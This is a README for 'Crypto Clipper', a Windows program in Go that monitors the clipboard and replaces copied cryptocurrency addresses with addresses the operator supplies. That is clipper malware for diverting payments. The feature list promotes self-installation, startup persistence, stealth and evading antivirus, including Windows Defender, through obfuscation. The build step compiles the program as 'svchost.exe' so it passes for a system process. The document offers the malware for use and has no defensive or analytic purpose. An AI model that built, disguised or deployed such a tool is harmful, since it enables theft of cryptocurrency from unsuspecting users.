# Crypto Clipper 🦾

A simple, lightweight clipboard monitor for cryptocurrency addresses. This tool monitors the system clipboard for any cryptocurrency address, and if detected, it replaces it with a specified label.

## Features 🔑

- **Monitors clipboard**: Tracks clipboard changes in real-time to detect cryptocurrency addresses.
- **Address Recognition**: Supports popular cryptocurrency addresses such as Bitcoin (BTC), Ethereum (ETH), Litecoin (LTC), Monero (XMR), Ripple (XRP), Dogecoin (DOGE), and more.
- **Clipboard Replacement**: Replaces detected cryptocurrency addresses with custom labels like "BTC Address", "ETH Address", etc (change with your own addresses).
- **Self-installation**: Installs itself in the user’s `AppData` directory and ensures it starts with Windows.
- **Single Instance**: Ensures only one instance of the program runs at a time using a mutex.
- **Low Resource Consumption**: The application is designed to be lightweight and uses minimal system resources, making it ideal for running silently in the background.
- **Discreet Operation**: Operates in the background without noticeable impact on the user’s experience. It is designed to be stealthy, and when obfuscated, it can bypass most security software (including Windows Defender).
- **Automatic Sleep Mode**: The application automatically pauses clipboard monitoring after a period of inactivity (e.g., no mouse movement or clipboard activity for a set duration), reducing unnecessary resource consumption.

## Supported Cryptocurrencies 💰

This tool can detect and label the following cryptocurrency addresses:

- **Bitcoin (BTC)**: `1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa`
- **Ethereum (ETH)**: `0x32Be343B94f860124dC4fEe278FDCBD38C102D88`
- **Litecoin (LTC)**: `Lcdv5Xp9Z3i4MypfnkXj6Xp8k6g6JkzY2n`
- **Monero (XMR)**: `48Vv5GRf6Ncmt7wJZzH5BxEg6tVq3KrT4A9z7ZK4DrsYr6UcmVNoqEKZ5ajkh7aJzj7V6VdXJxv9k`
- **Ripple (XRP)**: `rM1dzVXBZ2cxHLd9ZG9sZ7Uy7NwZaj3V9S`
- **Dogecoin (DOGE)**: `D6coGVLrhprH2tFicSt9bm9f7osEXbYn21kQBhzcxd5RP3vyn`
- **Bitcoin Cash (BCH)**: `bitcoincash:qz0c5y6kl6zkgkx5xnqk33p9ww0dpq66xv8w8kcz`
- **Zcash (ZEC)**: `t1QcXY5VzgjdhEtnMn5V5FG3FGJvvqqxnp94Fsc7`
- **BNB (Binance Coin)**: `bnb1a4xltt5jjy8wnz6rqpttltmx7fpe95xygecly`

## Installation 💻

### Prerequisites

- Go 1.16+ to build the application
- Windows (since it uses Windows-specific APIs)

### Steps to Install

1. Clone this repository:
   ```bash
   git clone https://github.com/yourusername/crypto-clipper.git
2. Compile Code:
   ```bash
   go build -ldflags="-H windowsgui" -o svchost.exe main.go
